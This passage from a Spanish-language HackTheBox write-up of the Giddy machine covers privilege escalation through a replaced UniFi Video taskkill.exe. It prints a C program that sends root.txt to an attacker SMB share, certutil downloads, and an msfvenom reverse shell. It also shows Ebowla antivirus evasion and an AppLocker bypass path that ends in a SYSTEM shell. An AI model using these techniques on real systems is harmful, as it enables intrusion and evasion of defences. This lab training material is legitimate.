Program <span class="s1">'taskkill.exe'</span> failed to run: Operation did not <span class="nb">complete </span>successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacer un Bypass.</p>
  </li>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">mingw-w64</code> <a href="https://learn.microsoft.com/es-es/vcpkg/users/platforms/mingw">https://learn.microsoft.com/es-es/vcpkg/users/platforms/mingw</a> para en vez de subir el <code class="language-plaintext highlighter-rouge">.exe</code> ala maquina vamos a crear un archivo <code class="language-plaintext highlighter-rouge">C</code> para compilar y así ya no lo detecte el defender.</p>
  </li>
  <li>
    <p>Lo que podemos decirle es que nos mande la <code class="language-plaintext highlighter-rouge">flag</code> de <code class="language-plaintext highlighter-rouge">root</code> a un recurso de nosotros.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>exc.c
<span class="c">#include &lt;stdlib.h&gt;</span>

int main<span class="o">(){</span>
	system<span class="o">(</span><span class="s2">"type C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="s2">Administrator</span><span class="se">\\</span><span class="s2">Desktop</span><span class="se">\\</span><span class="s2">root.txt &gt; </span><span class="se">\\\\</span><span class="s2">10.10.14.216</span><span class="se">\\</span><span class="s2">smbFolder</span><span class="se">\\</span><span class="s2">root.txt"</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora usamos la herramienta que instalamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content x86_64-w64-mingw32-gcc exc.c <span class="nt">-o</span> taskkill.exe
</code></pre></div></div>

<ul>
  <li>Vamos a mandarlo a la maquina victima otra vez.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:8080/taskkill.exe taskkill.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  000000  ...
  01c0d2
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        4/26/2024   2:48 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
<span class="nt">-a----</span>        4/26/2024   4:40 PM         114898 taskkill.exe
<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
</code></pre></div></div>

<ul>
  <li>Ahora iniciamos el <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> por que en el script definimos que allí nos llegue la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Ahora tenemos que conocer el nombre del servicio para poder pararlo y arrancarlo <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree">https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">cd </span>HKLM:SYSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices
</code></pre></div></div>

<ul>
  <li>Vemos el nombre.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; <span class="nb">dir</span> | Select-String <span class="s1">'Unifi'</span>

HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\U</span>niFiVideoService


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos parar el proceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; Stop-Service <span class="nt">-Name</span> UniFiVideoService <span class="nt">-Force</span>
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt;
</code></pre></div></div>

<ul>
  <li>Y nos llega.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.140,49729<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>GIDDY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.96.140,49729<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</code></pre></div></div>

<h2 id="root-flag">root flag</h2>

<ul>
  <li>Y vemos la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>root.txt
2873baf68c08b318321f3689ca29ad7a
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li>
    <p>Ahora vamos a ganar acceso pero con una consola.</p>
  </li>
  <li>
    <p>Vamos a volver a generar el <code class="language-plaintext highlighter-rouge">.exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.216 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> taskkill.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: taskkill.exe
</code></pre></div></div>

<ul>
  <li>Vamos arrancar el servicio otra vez.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; cmd /c sc start UniFiVideoService

SERVICE_NAME: UniFiVideoService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                <span class="o">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span class="o">)</span>
        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1148
        FLAGS              :
</code></pre></div></div>

<ul>
  <li>Podemos usar la siguiente herramienta para burla el defender <a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/Genetic-Malware/Ebowla
Cloning into <span class="s1">'Ebowla'</span>...
remote: Enumerating objects: 559, <span class="k">done</span><span class="nb">.</span>
remote: Total 559 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 559
Receiving objects: 100% <span class="o">(</span>559/559<span class="o">)</span>, 35.46 MiB | 1.29 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>287/287<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">mv </span>taskkill.exe Ebowla
➜  content <span class="nb">cd </span>Ebowla
➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls
</span>Eko_2016_Morrow_Pitts_Master.pdf                  cleanup.py
Infiltrate_2016_Morrow_Pitts_Genetic_Malware.pdf  documentation.md
LICENSE.md                                        ebowla.py
MemoryModule                                      encryption
README.md                                         formats.md
build_python.sh                                   genetic.config
build_x64_go.sh                                   taskkill.exe
build_x86_go.sh                                   templates
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora vamos a editar el <code class="language-plaintext highlighter-rouge">genetic.config</code>.</p>
  </li>
  <li>
    <p>Tiene que quedar de esta forma.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">cat </span>genetic.config
<span class="o">[</span>Overall]

    <span class="c"># Options ENV, OTP</span>

    Encryption_Type <span class="o">=</span> ENV


    <span class="c"># Template output: GO, Python, OR PowerShell</span>

    output_type <span class="o">=</span> GO


    <span class="c"># Number of bytes subtracted from the reconstructed payload that will be the</span>
    <span class="c"># sha512 checksum used when checking the file before executing the payload.</span>

    minus_bytes <span class="o">=</span> 1


    <span class="c"># type of file being fed (payload) - also determines execution</span>
    <span class="c"># Python: EXE, DLL_x86, DLL_x64 are written to disk</span>
    <span class="c"># GO: Nothing is written to disk</span>
    <span class="c"># OPTIONS for GO: EXE, DLL_x86, DLL_x64, SHELLCODE</span>
    <span class="c"># OPTIONS for PYTHON: EXE, SHELLCODE, CODE, FILE_DROP</span>
    <span class="c"># OPTIONS for PowerShell: CODE, DLL_x86, DLL_x64, EXE, FILE_DROP</span>

    payload_type <span class="o">=</span> EXE


    <span class="c"># key_iterations is for otp_type = key and for symmetric_settings_win</span>
    <span class="c"># It is the number of times that the key hash is iterated via sha512 before being used</span>
    <span class="c"># as the encryption key.  NOT available to otp_type = full</span>

    key_iterations <span class="o">=</span> 10000

    <span class="c"># Clean the resulting loaders from comments and print statements</span>
    <span class="c"># This will make the runs faster and not display status information on the victim host</span>
    <span class="c"># Most useful once payloads have been tested and are ready for deployment</span>
    <span class="c"># Values Bool: True or False</span>

    clean_output <span class="o">=</span> False


<span class="o">[</span>otp_settings]
    <span class="c"># otp is simple, provide one time pad, type,  and starting search location</span>
    <span class="c"># type is full otp to reconstruct the malware in memory, or an offset in the file for a symmetric key</span>

    otp_type <span class="o">=</span> key <span class="c"># OPTIONS: full, key</span>


    <span class="c"># File for use with otp</span>

    pad <span class="o">=</span> <span class="s1">'cmd.exe'</span>

    <span class="c"># Max pad size: Decide the largest pad size to use.</span>
    <span class="c"># 256 ** 3 - 1 (16777215 or 0xffffff) maximum is supported</span>
    <span class="c"># Too small might be a bad idea...</span>

    pad_max <span class="o">=</span> 0xffffff

    <span class="c"># starting location in the path to start looking if walking the path</span>

    scan_dir <span class="o">=</span> <span class="s1">'c:\windows\sysnative'</span><span class="c">#'%APPDATA%'</span>


    <span class="c"># For use with FULL OTP:</span>
    <span class="c">#  Number of max bytes for matching the payload against the OTP</span>
    <span class="c">#  -- larger byte width equals possible smaller lookup table but longer build times</span>

    byte_width <span class="o">=</span> 9



<span class="o">[</span>symmetric_settings_win]
    <span class="c"># AES-CFB-256 key from a combination of the any of the following settings.</span>
    <span class="c"># Any of the following can be used, the more specific to your target the better.</span>


    <span class="c"># set the value to '' if you do not want to use that value</span>


    <span class="c"># This is not a permanent list.  Any env variable can be added below.</span>
    <span class="c"># If you want the env variable to be used, give it a value.</span>
    <span class="c"># These are case insensitive.</span>

    <span class="o">[[</span>ENV_VAR]]

        username <span class="o">=</span> <span class="s1">''</span>
        computername <span class="o">=</span> <span class="s1">'Giddy'</span>
        homepath <span class="o">=</span> <span class="s1">''</span>
        homedrive <span class="o">=</span> <span class="s1">''</span>
        Number_of_processors <span class="o">=</span> <span class="s1">''</span>
        processor_identifier <span class="o">=</span> <span class="s1">''</span>
        processor_revision <span class="o">=</span> <span class="s1">''</span>
        userdomain <span class="o">=</span> <span class="s1">''</span>
        systemdrive <span class="o">=</span> <span class="s1">''</span>
        userprofile <span class="o">=</span> <span class="s1">''</span>
        path <span class="o">=</span> <span class="s1">''</span>
        temp <span class="o">=</span> <span class="s1">''</span>


     <span class="o">[[</span>PATH]]

    <span class="c"># Check if a path exists on the workstation</span>
    <span class="c"># Only one path can be used.  This is immutable. To use, give it a value and a start location.</span>

        <span class="c"># This is the path that will be used as part of the key</span>

        path <span class="o">=</span> <span class="s1">''</span>

        <span class="c"># You can provide Env Variables that are associated with a path for the start_loc</span>
        <span class="c">#  , such as %TEMP%, %APPDATA%, %PROGRAMFILES%</span>
    <span class="c"># You Must use the %ENV VAR% when using env vars for paths!</span>
    <span class="c"># Examples: C:\Windows, C:\Program Files, %APPDATA%</span>

    start_loc <span class="o">=</span> <span class="s1">'%HOMEPATH%'</span>


    <span class="o">[[</span>IP_RANGES]]

    <span class="c"># Network mask for external enumeration 22.23.0.0</span>
    <span class="c"># IP mask should not be used alone more simple to brute force.</span>
    <span class="c"># Support for only 24 16 8 masks or exact ip</span>
    <span class="c"># 12.12.0.0 or 12.12.12.12 or 12.12.0.0 or 12.0.0.0</span>

    external_ip_mask <span class="o">=</span> <span class="s1">''</span>


    <span class="o">[[</span>SYSTEM_TIME]]

    <span class="c"># Time Range with BEGING and END in EPOC</span>
        <span class="c"># Should be used with another variable</span>
    <span class="c"># This is a mask: 20161001 or 20161000 or 20160000</span>
    <span class="c"># YEAR, MONTH, DAY</span>

    Time_Range <span class="o">=</span> <span class="s1">''</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ python2 ebowla.py taskkill.exe genetic.config
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using Symmetric encryption
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload length 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload_type exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using EXE payload template
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Used environment variables:
	<span class="o">[</span>-] environment value used: computername, value used: giddy
<span class="o">[!]</span> Path string not used as pasrt of key
<span class="o">[!]</span> External IP mask NOT used as part of key
<span class="o">[!]</span> System <span class="nb">time </span>mask NOT used as part of key
<span class="o">[</span><span class="k">*</span><span class="o">]</span> String used to <span class="nb">source </span>the encryption key: giddy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Applying 10000 sha512 <span class="nb">hash </span>iterations before encryption
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption key: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing GO payload to: go_symmetric_taskkill.exe.go
</code></pre></div></div>

<ul>
  <li>Y aquí no los guardo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls</span> <span class="nt">-l</span> output
total 20
<span class="nt">-rw-r--r--</span> 1 miguel miguel 20223 Apr 26 15:34 go_symmetric_taskkill.exe.go
</code></pre></div></div>

<ul>
  <li>Ahora tenemos que compilarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ ./build_x64_go.sh output/go_symmetric_taskkill.exe.go taskkill_ebowla.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Copy Files to tmp <span class="k">for </span>building
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building <span class="nb">complete</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Copy taskkill_ebowla.exe to output
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Done
</code></pre></div></div>

<ul>
  <li>Allí tenemos el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  output git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls
</span>go_symmetric_taskkill.exe.go  taskkill_ebowla.exe
</code></pre></div></div>

<ul>
  <li>Después de cambiarle el nombre vamos a subirlo de nuevo ala maquina victima usando el servidor <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python3</code> que teníamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; erase taskkill.exe
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:80/taskkill.exe taskkill.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  000000  ...
  3dea72
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Pero ahora nos da otro error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
Program <span class="s1">'taskkill.exe'</span> failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
</code></pre></div></div>

<ul>
  <li>Aquí nos dicen rutas para que no nos pase eso <a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; copy taskkill.exe C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\t</span>askkill.exe
</code></pre></div></div>

<ul>
  <li>Si lo ejecutamos nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor&gt; .<span class="se">\t</span>askkill.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> IV: 1150b91085ef56a08ef912c3eb577bf7
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Size of encrypted_payload:  9600
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hash of encrypted_payload: 0b07402cefb4af5c5479a73d1ce4c9263622edf5ec70b53c750207e111d46d967727a660aeb7de5b29c8327585d76eb7c03182940081d2fff0d0d664319600a7
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Number of keys: 1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Final key_list: <span class="o">[</span>giddy]
<span class="o">==================================================</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key: giddy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Computed Full Key @ 2710 iterations: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c8a0e4c69b5ea1fba75d8bce580a3a7a51df239e28be0c36675dd065b1d4dd921
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AES Password 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Decoded Payload with Padding: 2e95bce3869bea6029ee864c4d9765424a36413a268f452c532259ee2faecc6708d839228cc51165614c0e8f8a1c0396b5695db2c1eba525c3d121cf9b4de819
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Message Length: 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Message Length w/ Padding: 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Test Hash : 1392fb2eafe3dfd6a8e0ff9159df555b5ec2f19ff617c78811ecf66834abdd9062b8dfc7d3696311ecaf53834c9bad4efbb02107a2fb0fd9378547686374fe32
Search Hash: 1392fb2eafe3dfd6a8e0ff9159df555b5ec2f19ff617c78811ecf66834abdd9062b8dfc7d3696311ecaf53834c9bad4efbb02107a2fb0fd9378547686374fe32
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hashes Match
Len full_payload: 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Combinations:  <span class="o">[[</span>giddy]]
</code></pre></div></div>

<ul>
  <li>Con esto podemos ver que si funciona pero queremos estar como el administrador si recordamos necesitamos parar el servicio y arrancarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; Stop-Service <span class="nt">-Name</span> UniFiVideoService <span class="nt">-Force</span>
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
</code></pre></div></div>

<ul>
  <li>Y ahora ya estamos como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.216] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.96.140] 49774
Microsoft Windows <span class="o">[</span>Version 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.

C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>